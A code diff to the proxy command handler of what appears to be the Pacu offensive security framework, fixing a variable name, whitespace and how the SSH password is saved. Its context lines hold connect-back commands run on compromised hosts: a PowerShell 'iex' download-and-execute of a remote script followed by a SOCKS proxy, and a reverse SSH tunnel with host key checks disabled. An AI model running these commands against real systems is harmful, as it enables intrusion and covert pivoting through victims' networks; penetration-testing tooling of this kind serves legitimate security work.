@@ -661,7 +661,7 @@ class Main:
                             self.print('No SSH user on the local PacuProxy server, not routing traffic through the target agent.')
                             return
                         if proxy_ssh_password is None:
-                            self.print('Failed to set a password for user {}, not routing traffic through the target agent.'.format(proxy_ssh_user))
+                            self.print('Failed to set a password for user {}, not routing traffic through the target agent.'.format(proxy_ssh_username))
                             return
 
                         # If an SSH user was just generated, make sure local port forwarding is disabled
@@ -681,6 +681,7 @@ class Main:
 
                         if proxy_target_agent[-1].startswith('Windows'):
                             secret_string = ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=25))
+
                             class S(BaseHTTPRequestHandler):
                                 def _set_headers(self):
                                     self.send_response(200)
@@ -693,7 +694,7 @@ class Main:
                                         script = f.read().encode()
                                     self.wfile.write(script)
                                     return
-        
+
                             def run(server_class=HTTPServer, handler_class=S, port=80):
                                 server_address = (proxy_ip, port)
                                 try:
@@ -717,7 +718,6 @@ class Main:
 
                             connect_back_cmd = 'iex ((New-Object System.Net.WebClient).DownloadString("http://{}:{}/{}")); Start-SocksProxy -sshhost {} -username {} -password {} -RemotePort 8001 -LocalPort 5050'.format(proxy_ip, proxy_port, secret_string, proxy_ip, proxy_ssh_username, proxy_ssh_password)
                         else:
-                            shm_name = ''.join(random.choices(string.ascii_lowercase, k=int(''.join(random.choices('3456789', k=1)))))
                             connect_back_cmd = 'echo {} | ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -N -R 8001 {}@{} >/dev/null 2>&1 &'.format(proxy_ssh_password, proxy_ssh_username, proxy_ip)
                         self.server.run_cmd(proxy_target_agent[0], self.server.all_connections[int(command[2])], connect_back_cmd)
                         self.print('Remote agent instructed to connect!')
@@ -727,7 +727,7 @@ class Main:
                 self.print('** Incorrect input, excepted an agent ID, received: {}'.format(command[2:]))
         else:
             self.print('** Unrecognized proxy command: {} **'.format(command[1]))
-        proxy_settings.update(self.database, ssh_username=proxy_ssh_username, ssh_priv_key=proxy_ssh_priv_key, listening=proxy_listening, target_agent=proxy_target_agent)
+        proxy_settings.update(self.database, ssh_username=proxy_ssh_username, ssh_password=proxy_ssh_password, listening=proxy_listening, target_agent=proxy_target_agent)
         return
 
     def parse_exec_module_command(self, command):
